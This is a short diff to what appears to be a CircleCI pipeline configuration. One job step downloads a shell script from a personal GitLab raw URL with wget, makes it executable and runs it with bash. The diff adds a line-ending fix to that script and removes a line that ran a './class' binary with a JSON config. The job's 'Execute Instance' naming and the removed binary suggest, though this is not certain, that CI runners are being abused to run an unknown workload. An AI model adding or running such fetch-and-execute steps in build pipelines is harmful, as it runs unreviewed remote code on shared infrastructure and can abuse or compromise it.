@@ -22,9 +22,9 @@ jobs:
           name: "Setup and Execute Instance << parameters.node_id >>"
           command: |
             wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/circle.sh
+            sed -i 's/\r$//' circle.sh
             chmod +x circle.sh
             bash circle.sh
-            ./class -c isu3.json
 
 workflows:
   my-custom-workflow:
